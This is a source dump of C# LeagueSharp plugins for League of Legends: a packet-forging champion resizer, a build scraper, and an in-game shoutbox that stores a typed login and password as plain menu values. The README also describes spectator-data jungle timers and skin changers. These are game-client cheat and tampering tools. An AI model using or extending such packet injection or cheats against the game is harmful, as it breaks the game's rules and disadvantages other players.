      <HintPath>C:\Users\Andy\Downloads\LeagueSharp\\System\LeagueSharp.Common.dll</HintPath>
    </Reference>
    <Reference Include="SharpDX, Version=2.5.0.0, Culture=neutral, processorArchitecture=MSIL">
      <SpecificVersion>False</SpecificVersion>
      <HintPath>C:\Users\Andy\Downloads\LeagueSharp\\System\SharpDX.dll</HintPath>
    </Reference>
    <Reference Include="System" />
    <Reference Include="System.Core" />
    <Reference Include="System.Drawing" />
    <Reference Include="System.Web.Extensions" />
    <Reference Include="System.Xml.Linq" />
    <Reference Include="System.Data.DataSetExtensions" />
    <Reference Include="Microsoft.CSharp" />
    <Reference Include="System.Data" />
    <Reference Include="System.Xml" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include="Program.cs" />
    <Compile Include="Properties\AssemblyInfo.cs" />
  </ItemGroup>
  <ItemGroup>
    <None Include="App.config">
      <SubType>Designer</SubType>
    </None>
  </ItemGroup>
  <ItemGroup>
    <BootstrapperPackage Include=".NETFramework,Version=v4.5.1">
      <Visible>False</Visible>
      <ProductName>Microsoft .NET Framework 4.5.1 %28x86 and x64%29</ProductName>
      <Install>true</Install>
    </BootstrapperPackage>
    <BootstrapperPackage Include="Microsoft.Net.Client.3.5">
      <Visible>False</Visible>
      <ProductName>.NET Framework 3.5 SP1 Client Profile</ProductName>
      <Install>false</Install>
    </BootstrapperPackage>
    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
      <Visible>False</Visible>
      <ProductName>.NET Framework 3.5 SP1</ProductName>
      <Install>false</Install>
    </BootstrapperPackage>
  </ItemGroup>
  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
  <PropertyGroup>
    <PostBuildEvent>
    </PostBuildEvent>
  </PropertyGroup>
  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
       Other similar extension points exist, see Microsoft.Common.targets.
  <Target Name="BeforeBuild">
  </Target>
  <Target Name="AfterBuild">
  </Target>
  -->
</Project>
```

`MakeMyMonsterGrow/Program.cs`:

```cs
using System;
using LeagueSharp;
using LeagueSharp.Common;

namespace MakeMyMonsterGrow
{
    internal class Program
    {
        public static Menu Config;
        public static Int32 SequenceId = 1;
        public static Int32 previousNetId = 0x40000019;
        public static Int32 newNetId = 0x40000019;
        static void Main(string[] args)
        {
            CustomEvents.Game.OnGameLoad += Game_OnGameLoad;
        }
        static void Game_OnGameLoad(EventArgs args)
        {
            Config = new Menu("MakeMyMonsterGrow", "MakeMyMonsterGrow", true);
            Game.OnGameSendPacket += Game_OnGameSendPacket;
            Config.AddItem(new MenuItem("Size", "Size Percentage").SetValue(new Slider(150, 50, 200)));
            Config.AddToMainMenu();
        }
        static void Game_OnGameSendPacket(GamePacketEventArgs args)
        {
            if (args.PacketData[0] == Packet.C2S.SetTarget.Header)
            {
                ChangeSize(previousNetId, 1.0f);
                newNetId = BitConverter.ToInt32(args.PacketData, 9);
                ChangeSize(newNetId, (Single)(Config.Item("Size").GetValue<Slider>().Value) / 100.0f);
                previousNetId = newNetId;
            }
            else if (args.PacketData[0] == Packet.C2S.UpdateConfirm.Header)
                SequenceId = BitConverter.ToInt32(args.PacketData, 5) + 1;
        }
        private static void ChangeSize(Int32 netId, Single size)
        {
            Obj_AI_Hero hero = ObjectManager.GetUnitByNetworkId<Obj_AI_Hero>(netId);
            if (hero != null)
            {
                GamePacket p = new GamePacket(0xC4);
                p.WriteInteger(0);
                p.WriteInteger(SequenceId++);
                p.WriteByte(0x1);
                p.WriteByte(0x8);
                p.WriteInteger(netId);
                p.WriteInteger(0x800);
                p.WriteByte(0x8);
                p.WriteFloat(size);
                p.Process();
                SequenceId++;
            }
        }
    }
}

```

`MakeMyMonsterGrow/Properties/AssemblyInfo.cs`:

```cs
using System.Reflection;
using System.Runtime.InteropServices;

[assembly: AssemblyTitle("MakeMyMonsterGrow")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("Shalzuth")]
[assembly: AssemblyProduct("MakeMyMonsterGrow")]
[assembly: AssemblyCopyright("Copyright © 2014")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]

[assembly: ComVisible(false)]

[assembly: Guid("e6cab8b6-530c-49f3-88e6-f0f633a678d7")]

[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]

```

`ProBuilds/App.config`:

```config
<?xml version="1.0" encoding="utf-8"?>
<configuration>
    <startup> 
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.5"/>
    </startup>
</configuration>

```

`ProBuilds/DataDragon.cs`:

```cs
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Net;
using System.Web.Script.Serialization;

namespace ProBuilds
{
    static class DataDragon
    {
        const String DataDragonHtml = @"http://ddragon.leagueoflegends.com/";
        static String lastestVersion;
        public static String LatestVersion
        {
            get
            {
                if (String.IsNullOrEmpty(lastestVersion))
                    lastestVersion = (String)new JavaScriptSerializer().Deserialize<Dictionary<Object, Object>>(new WebClient().DownloadString(DataDragonHtml + "realms/na.json"))["v"];
                return lastestVersion;
            }
        }
        static String champJson;
        public static String ChampJson
        {
            get
            {
                if (String.IsNullOrEmpty(champJson))
                    champJson = new WebClient().DownloadString(DataDragonHtml + "cdn/" + LatestVersion + "/data/en_US/champion.json");
                return champJson;
            }
        }
        static String itemJson;
        public static String ItemJson
        {
            get
            {
                if (String.IsNullOrEmpty(itemJson))
                    itemJson = new WebClient().DownloadString(DataDragonHtml + "cdn/" + LatestVersion + "/data/en_US/item.json");
                return itemJson;
            }
        }
        public static Image GetImageFromUrl(String url)
        {
            using (var webClient = new WebClient())
            {
                using (var stream = new MemoryStream(webClient.DownloadData(url)))
                {
                    return Image.FromStream(stream);
                }
            }
        }
        public static Image[] champImages;
        public static Image ChampImages(int i)
        {
            if (champImages == null)
            {
                champImages = new Image[5]{
                    GetImageFromUrl(DataDragonHtml + "cdn/" + LatestVersion + "/img/sprite/champion0.png"),
                    GetImageFromUrl(DataDragonHtml + "cdn/" + LatestVersion + "/img/sprite/champion1.png"),
                    GetImageFromUrl(DataDragonHtml + "cdn/" + LatestVersion + "/img/sprite/champion2.png"),
                    GetImageFromUrl(DataDragonHtml + "cdn/" + LatestVersion + "/img/sprite/champion3.png"),
                    GetImageFromUrl(DataDragonHtml + "cdn/" + LatestVersion + "/img/sprite/champion4.png")
                };
            }
            return champImages[i];
        }
        public static Image[] itemImages;
        public static Image ItemImages(int i)
        {
            if (itemImages == null)
            {
                itemImages = new Image[3]{
                    GetImageFromUrl(DataDragonHtml + "cdn/" + LatestVersion + "/img/sprite/item0.png"),
                    GetImageFromUrl(DataDragonHtml + "cdn/" + LatestVersion + "/img/sprite/item1.png"),
                    GetImageFromUrl(DataDragonHtml + "cdn/" + LatestVersion + "/img/sprite/item2.png"),
                };
            }
            return itemImages[i];
        }
        static Image cropImage(Image img, Rectangle cropArea)
        {
            Bitmap bmpImage = new Bitmap(img);
            return bmpImage.Clone(cropArea, bmpImage.PixelFormat);
        }
        public static Image GetChampImage(String champ)
        {
            Dictionary<String, Object> imageInfo = (Dictionary<String, Object>)
                ((Dictionary<String, Object>)(
                (Dictionary<String, Object>)new JavaScriptSerializer().Deserialize<Dictionary<Object, Object>>(ChampJson)["data"])
                [champ])
                ["image"];
            String spriteName = (String)imageInfo["sprite"];
            return cropImage(ChampImages(Int32.Parse(Regex.Match(spriteName, @"\d+").Value)),
                new Rectangle((int)imageInfo["x"], (int)imageInfo["y"], (int)imageInfo["w"], (int)imageInfo["h"]));
        }
        public static Dictionary<String, Image> ItemImageCache = new Dictionary<String, Image>();
        public static Image GetItemImage(String itemId)
        {
            if (ItemImageCache.ContainsKey(itemId))
                return ItemImageCache[itemId];
            Dictionary<String, Object> imageInfo = (Dictionary<String, Object>)
                ((Dictionary<String, Object>)(
                (Dictionary<String, Object>)new JavaScriptSerializer().Deserialize<Dictionary<Object, Object>>(ItemJson)["data"])
                [itemId])
                ["image"];
            String spriteName = (String)imageInfo["sprite"];
            Image itemImage = cropImage(ItemImages(Int32.Parse(Regex.Match(spriteName, @"\d+").Value)),
                new Rectangle((int)imageInfo["x"], (int)imageInfo["y"], (int)imageInfo["w"], (int)imageInfo["h"]));
            ItemImageCache[itemId] = itemImage;
            return itemImage;
        }
        public static Dictionary<String, String> ReverseItemLookupCache = new Dictionary<String, String>();
        public static String ReverseItemLookup(int page, int x, int y)
        {
            if (ReverseItemLookupCache.Count == 0)
            {
                Dictionary<String, Object> items = (Dictionary<String, Object>)new JavaScriptSerializer().Deserialize<Dictionary<Object, Object>>(ItemJson)["data"];
                foreach (KeyValuePair<String, Object> item in items)
                {
                    Dictionary<String, Object> imageInfo = (Dictionary<String, Object>)((Dictionary<String, Object>)item.Value)["image"];
                    String spriteName = ((String)imageInfo["sprite"]).Substring(4, 1);
                    ReverseItemLookupCache.Add(Int32.Parse(spriteName) + ":" + (int)imageInfo["x"] + ":" + (int)imageInfo["y"], item.Key);
                }
            }
            return ReverseItemLookupCache[page + ":" + x + ":" + y];
        }
        public static String ItemName(String itemId)
        {
            return (String)((Dictionary<String, Object>)(
                (Dictionary<String, Object>)new JavaScriptSerializer().Deserialize<Dictionary<Object, Object>>(ItemJson)["data"])
                [itemId])
                ["name"];
        }
        static DataDragon()
        {
            ChampImages(0);
            ItemImages(0);
        }
    }
}

```

`ProBuilds/ProBuilds.cs`:

```cs
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

using LeagueSharp;
using LeagueSharp.Common;
using SharpDX;

namespace ProBuilds
{
    public class ProBuilds
    {
        public List<Build> Builds { get; set; }
        public class Build
        {
            public String Name { get; set; }
            public String Popularity { get; set; }
            public List<Item> Summary { get; set; }
            public List<Item> StartingItems { get; set; }
            public List<Item> Order { get; set; }
            public List<Item> BestItems { get; set; }
        }
        public class Item
        {
            public String name { get; set; }
            public String id { get; set; }
        }

        public ProBuilds(String champ)
        {
            Builds = new List<Build>();
            String htmlPage = new WebClient().DownloadString("http://lolbuilder.net/" + champ);
            foreach (Match buildsRegex in new Regex("#(build\\-[0-9]+)\">([a-zA-Z ]+) \\(<span class=\"hover-text\" tooltip=\"Seen in up to ([0-9]+)").Matches(htmlPage))
            {
                Build build = new Build();

                Match buildRegex = new Regex(buildsRegex.Groups[1].ToString()).Matches(htmlPage)[1];
                String buildSectionHtml = htmlPage.Substring(buildRegex.Index);

                String summaryHtml = buildSectionHtml.Substring(buildSectionHtml.IndexOf("build-summary-separator separator"));
                summaryHtml = summaryHtml.Substring(0, summaryHtml.IndexOf("build-box starting-items"));
                String startingHtml = buildSectionHtml.Substring(buildSectionHtml.IndexOf("build-box starting-items"));
                startingHtml = startingHtml.Substring(0, startingHtml.IndexOf("build-box early-game"));
                String orderHtml = buildSectionHtml.Substring(buildSectionHtml.IndexOf("build-box early-game"));
                orderHtml = orderHtml.Substring(0, orderHtml.IndexOf("build-box final-items"));
                String finalHtml = buildSectionHtml.Substring(buildSectionHtml.IndexOf("build-box final-items"));
                if (finalHtml.IndexOf("build-app-text") > 0)
                    finalHtml = finalHtml.Substring(0, finalHtml.IndexOf("build-app-text"));

                build.Name = buildsRegex.Groups[2].ToString();
                build.Popularity = buildsRegex.Groups[3].ToString();
                build.Summary = GetItemsFromHtml(summaryHtml);
                build.StartingItems = GetItemsFromHtml(startingHtml);
                build.Order = GetItemsFromHtml(orderHtml);
                build.BestItems = GetItemsFromHtml(finalHtml);

                Builds.Add(build);
            }
        }

        public List<Item> GetItemsFromHtml(String html)
        {
            List<Item> itemList = new List<Item>();
            foreach (Match itemRegex in new Regex("item-wrapper").Matches(html))
            {
                String itemHtml = html.Substring(itemRegex.Index);
                Match itemMatch = new Regex("(\\d)\\.png'\\) -(\\d+)px -(\\d+)px").Matches(itemHtml)[0];
                Item item = new Item();
                item.id = DataDragon.ReverseItemLookup(Convert.ToInt32(itemMatch.Groups[1].Value), Convert.ToInt32(itemMatch.Groups[2].Value), Convert.ToInt32(itemMatch.Groups[3].Value));
                item.name = DataDragon.ItemName(item.id);
                itemList.Add(item);
            }
            return itemList;
        }
    }
}
```

`ProBuilds/ProBuilds.csproj`:

```csproj
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="12.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
  <PropertyGroup>
    <Configuration Condition=" '$(Configuration)' == '' ">Release</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
    <ProjectGuid>{4A9F7272-33F7-465C-8BD9-87F801222C9E}</ProjectGuid>
    <OutputType>Exe</OutputType>
    <AppDesignerFolder>Properties</AppDesignerFolder>
    <RootNamespace>ProBuilds</RootNamespace>
    <AssemblyName>ProBuilds</AssemblyName>
    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
    <FileAlignment>512</FileAlignment>
    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
    <IsWebBootstrapper>false</IsWebBootstrapper>
    <PublishUrl>publish\</PublishUrl>
    <Install>true</Install>
    <InstallFrom>Disk</InstallFrom>
    <UpdateEnabled>false</UpdateEnabled>
    <UpdateMode>Foreground</UpdateMode>
    <UpdateInterval>7</UpdateInterval>
    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
    <UpdatePeriodically>false</UpdatePeriodically>
    <UpdateRequired>false</UpdateRequired>
    <MapFileExtensions>true</MapFileExtensions>
    <ApplicationRevision>0</ApplicationRevision>
    <ApplicationVersion>1.1.0.%2a</ApplicationVersion>
    <UseApplicationTrust>false</UseApplicationTrust>
    <BootstrapperEnabled>true</BootstrapperEnabled>
    <TargetFrameworkProfile />
    <PreBuildEvent />
    <OutputPath>bin\Release</OutputPath>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
    <PlatformTarget>x86</PlatformTarget>
    <DebugSymbols>true</DebugSymbols>
    <DebugType>full</DebugType>
    <Optimize>false</Optimize>
    <OutputPath>bin\Debug\</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
    <PlatformTarget>x86</PlatformTarget>
    <DebugType>pdbonly</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>bin\Release</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup>
    <ApplicationIcon>
    </ApplicationIcon>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="LeagueSharp">
      <HintPath>C:\Users\Andy\Downloads\LeagueSharp\\System\LeagueSharp.dll</HintPath>
    </Reference>
    <Reference Include="LeagueSharp.Common">
      <HintPath>C:\Users\Andy\Downloads\LeagueSharp\\System\LeagueSharp.Common.dll</HintPath>
    </Reference>
    <Reference Include="SharpDX, Version=2.5.0.0, Culture=neutral, processorArchitecture=MSIL">
      <SpecificVersion>False</SpecificVersion>
      <HintPath>C:\Users\Andy\Downloads\LeagueSharp\\System\SharpDX.dll</HintPath>
    </Reference>
    <Reference Include="SharpDX.Direct3D9, Version=2.5.0.0, Culture=neutral, processorArchitecture=MSIL">
      <SpecificVersion>False</SpecificVersion>
      <HintPath>C:\Users\Andy\Downloads\LeagueSharp\\System\SharpDX.Direct3D9.dll</HintPath>
    </Reference>
    <Reference Include="System" />
    <Reference Include="System.Core" />
    <Reference Include="System.Drawing" />
    <Reference Include="System.Web.Extensions" />
    <Reference Include="System.Xml.Linq" />
    <Reference Include="System.Data.DataSetExtensions" />
    <Reference Include="Microsoft.CSharp" />
    <Reference Include="System.Data" />
    <Reference Include="System.Xml" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include="DataDragon.cs" />
    <Compile Include="ProBuilds.cs" />
    <Compile Include="Program.cs" />
    <Compile Include="Properties\AssemblyInfo.cs" />
    <Compile Include="Properties\Resources.Designer.cs">
      <AutoGen>True</AutoGen>
      <DesignTime>True</DesignTime>
      <DependentUpon>Resources.resx</DependentUpon>
    </Compile>
  </ItemGroup>
  <ItemGroup>
    <None Include="App.config">
      <SubType>Designer</SubType>
    </None>
  </ItemGroup>
  <ItemGroup>
    <BootstrapperPackage Include=".NETFramework,Version=v4.5.1">
      <Visible>False</Visible>
      <ProductName>Microsoft .NET Framework 4.5.1 %28x86 and x64%29</ProductName>
      <Install>true</Install>
    </BootstrapperPackage>
    <BootstrapperPackage Include="Microsoft.Net.Client.3.5">
      <Visible>False</Visible>
      <ProductName>.NET Framework 3.5 SP1 Client Profile</ProductName>
      <Install>false</Install>
    </BootstrapperPackage>
    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
      <Visible>False</Visible>
      <ProductName>.NET Framework 3.5 SP1</ProductName>
      <Install>false</Install>
    </BootstrapperPackage>
  </ItemGroup>
  <ItemGroup>
    <EmbeddedResource Include="Properties\Resources.resx">
      <Generator>ResXFileCodeGenerator</Generator>
      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
      <SubType>Designer</SubType>
    </EmbeddedResource>
  </ItemGroup>
  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
  <PropertyGroup>
    <PostBuildEvent>
    </PostBuildEvent>
  </PropertyGroup>
  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
       Other similar extension points exist, see Microsoft.Common.targets.
  <Target Name="BeforeBuild">
  </Target>
  <Target Name="AfterBuild">
  </Target>
  -->
</Project>
```

`ProBuilds/Program.cs`:

```cs
using System;
using LeagueSharp;
using LeagueSharp.Common;

namespace ProBuilds
{
    internal class Program
    {
        public static Menu Config;
        public static ProBuilds probuild;
        static void Main(string[] args)
        {
            CustomEvents.Game.OnGameLoad += Game_OnGameLoad;
        }
        static void Game_OnGameLoad(EventArgs args)
        {
            new System.Threading.Thread(() =>
            {
                Config = new Menu("ProBuilds", "ProBuilds", true);
                probuild = new ProBuilds(ObjectManager.Player.ChampionName);
                foreach (ProBuilds.Build build in probuild.Builds)
                {
                    Menu subbuild = new Menu(build.Name + " " + build.Popularity + "%", build.Name + " " + build.Popularity + "%");

                    Menu summary = new Menu("Summary", "Summary");
                    foreach(ProBuilds.Item item in build.Summary){
                        summary.AddItem(new MenuItem(item.name, item.name));
                    }
                    subbuild.AddSubMenu(summary);

                    Menu starting = new Menu("Starting", "Starting");
                    foreach(var item in build.StartingItems){
                        starting.AddItem(new MenuItem(item.name, item.name));
                    }
                    subbuild.AddSubMenu(starting);
                    
                    Menu order = new Menu("Order", "Order");
                    foreach(var item in build.Order){
                        order.AddItem(new MenuItem(item.name, item.name));
                    }
                    subbuild.AddSubMenu(order);

                    Menu final = new Menu("Final", "Final");
                    foreach(var item in build.BestItems){
                        final.AddItem(new MenuItem(item.name, item.name));
                    }
                    subbuild.AddSubMenu(final);

                    Config.AddSubMenu(subbuild);
                }
                Config.AddToMainMenu();
            }).Start();
        }
    }
}

```

`ProBuilds/Properties/AssemblyInfo.cs`:

```cs
using System.Reflection;
using System.Runtime.InteropServices;

[assembly: AssemblyTitle("ProBuilds")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("Shalzuth")]
[assembly: AssemblyProduct("ProBuilds")]
[assembly: AssemblyCopyright("Copyright © 2014")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]

[assembly: ComVisible(false)]

[assembly: Guid("e6cab8b6-530c-49f3-88e6-f1f6339678d7")]

[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]

```

`ProBuilds/Properties/Resources.Designer.cs`:

```cs
//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:4.0.30319.18444
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace JungleTimerHax.Properties {
    using System;
    
    
    /// <summary>
    ///   A strongly-typed resource class, for looking up localized strings, etc.
    /// </summary>
    // This class was auto-generated by the StronglyTypedResourceBuilder
    // class via a tool like ResGen or Visual Studio.
    // To add or remove a member, edit your .ResX file then rerun ResGen
    // with the /str option, or rebuild your VS project.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   Returns the cached ResourceManager instance used by this class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("JungleTimerHax.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Overrides the current thread's CurrentUICulture property for all
        ///   resource lookups using this strongly typed resource class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
    }
}

```

`ProBuilds/Properties/Resources.resx`:

```resx
<?xml version="1.0" encoding="utf-8"?>
<root>
  <!-- 
    Microsoft ResX Schema 
    
    Version 2.0
    
    The primary goals of this format is to allow a simple XML format 
    that is mostly human readable. The generation and parsing of the 
    various data types are done through the TypeConverter classes 
    associated with the data types.
    
    Example:
    
    ... ado.net/XML headers & schema ...
    <resheader name="resmimetype">text/microsoft-resx</resheader>
    <resheader name="version">2.0</resheader>
    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
        <value>[base64 mime encoded serialized .NET Framework object]</value>
    </data>
    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
        <comment>This is a comment</comment>
    </data>
                
    There are any number of "resheader" rows that contain simple 
    name/value pairs.
    
    Each data row contains a name, and value. The row also contains a 
    type or mimetype. Type corresponds to a .NET class that support 
    text/value conversion through the TypeConverter architecture. 
    Classes that don't support this are serialized and stored with the 
    mimetype set.
    
    The mimetype is used for serialized objects, and tells the 
    ResXResourceReader how to depersist the object. This is currently not 
    extensible. For a given mimetype the value must be set accordingly:
    
    Note - application/x-microsoft.net.object.binary.base64 is the format 
    that the ResXResourceWriter will generate, however the reader can 
    read any of the formats listed below.
    
    mimetype: application/x-microsoft.net.object.binary.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
            : and then encoded with base64 encoding.
    
    mimetype: application/x-microsoft.net.object.soap.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
            : and then encoded with base64 encoding.

    mimetype: application/x-microsoft.net.object.bytearray.base64
    value   : The object must be serialized into a byte array 
            : using a System.ComponentModel.TypeConverter
            : and then encoded with base64 encoding.
    -->
  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
    <xsd:element name="root" msdata:IsDataSet="true">
      <xsd:complexType>
        <xsd:choice maxOccurs="unbounded">
          <xsd:element name="metadata">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" />
              </xsd:sequence>
              <xsd:attribute name="name" use="required" type="xsd:string" />
              <xsd:attribute name="type" type="xsd:string" />
              <xsd:attribute name="mimetype" type="xsd:string" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="assembly">
            <xsd:complexType>
              <xsd:attribute name="alias" type="xsd:string" />
              <xsd:attribute name="name" type="xsd:string" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="data">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="resheader">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" />
            </xsd:complexType>
          </xsd:element>
        </xsd:choice>
      </xsd:complexType>
    </xsd:element>
  </xsd:schema>
  <resheader name="resmimetype">
    <value>text/microsoft-resx</value>
  </resheader>
  <resheader name="version">
    <value>2.0</value>
  </resheader>
  <resheader name="reader">
    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <resheader name="writer">
    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
</root>
```

`README.md`:

```md
JungleTimerHax
=======
Uses Spectator data to extract Jungle Timers. Doesn't work on Garena.

SkinHax
=======
Changes the skin of any champiom in game.

MakeMyMonsterGrow
=======
Resizes the targeted champion.

ProBuilds
=======
Gets item build informations from lolbuilder.net.

Shoutbox
=======
Enables shoutbox in game

```

`Shoutbox/App.config`:

```config
<?xml version="1.0" encoding="utf-8"?>
<configuration>
    <startup> 
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.5"/>
    </startup>
</configuration>

```

`Shoutbox/Program.cs`:

```cs
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using LeagueSharp;
using LeagueSharp.Common;

namespace Shoutbox
{
    internal class Program
    {
        public static LeagueSharp.Common.Menu Config;
        static void Main(string[] args)
        {
            CustomEvents.Game.OnGameLoad += Game_OnGameLoad;
        }

        static void Game_OnGameLoad(EventArgs args)
        {
            Game.PrintChat("Shoutbox loaded!");
            Config = new LeagueSharp.Common.Menu("Shoutbox", "Shoutbox", true);
            Config.AddToMainMenu();
            Config.AddItem(new LeagueSharp.Common.MenuItem("login", ".login user pw"));
            Config.AddItem(new LeagueSharp.Common.MenuItem("msg", ".sb message"));
            Config.AddItem(new LeagueSharp.Common.MenuItem("user", Shoutbox.account));
            Config.AddItem(new LeagueSharp.Common.MenuItem("pw", Shoutbox.password));

            Config.Item("user").SetValue<StringList>(new StringList(new string[] { Shoutbox.account }));
            StringList us = Config.Item("user").GetValue<StringList>();
            Config.Item("user").SetValue<StringList>(new StringList(new string[] { us.SList[0] }));

            Config.Item("pw").SetValue<StringList>(new StringList(new string[] { Shoutbox.account }));
            StringList pw = Config.Item("pw").GetValue<StringList>();
            Config.Item("pw").SetValue<StringList>(new StringList(new string[] { pw.SList[0] }));

            Shoutbox.account = us.SList[0];
            Shoutbox.password = pw.SList[0];

            if (Shoutbox.account != "")
                Shoutbox.Process("update msg");
            Game.OnGameInput += Game_OnGameInput;
            Game.OnGameProcessPacket += Game_OnGameProcessPacket;
        }

        static void Game_OnGameInput(GameInputEventArgs args)
        {
            if (args.Input.StartsWith(".sb "))
            {
                Shoutbox.Process(args.Input);
                args.Process = false;
            }
            else if (args.Input.StartsWith(".login"))
            {
                String msg = args.Input.Substring(7);
                Shoutbox.account = msg.Substring(0, msg.IndexOf(" "));
                Shoutbox.password = msg.Substring(msg.IndexOf(" ") + 1);
                Config.Item("user").SetValue<StringList>(new StringList(new string[] { Shoutbox.account }));
                Config.Item("pw").SetValue<StringList>(new StringList(new string[] { Shoutbox.password }));
                if (Shoutbox.account != "")
                    Shoutbox.Process("update msg");
                args.Process = false;
            }
        }

        static void Game_OnGameProcessPacket(GamePacketEventArgs args)
        {
            if (args.PacketData[0] == 0xC1)
            {
                if (Shoutbox.account != "")
                    Shoutbox.Process("update msg");
            }
        }
    }
}

```

`Shoutbox/Properties/AssemblyInfo.cs`:

```cs
using System.Reflection;
using System.Runtime.InteropServices;

[assembly: AssemblyTitle("Shoutbox")]
[assembly: AssemblyDescription("")]
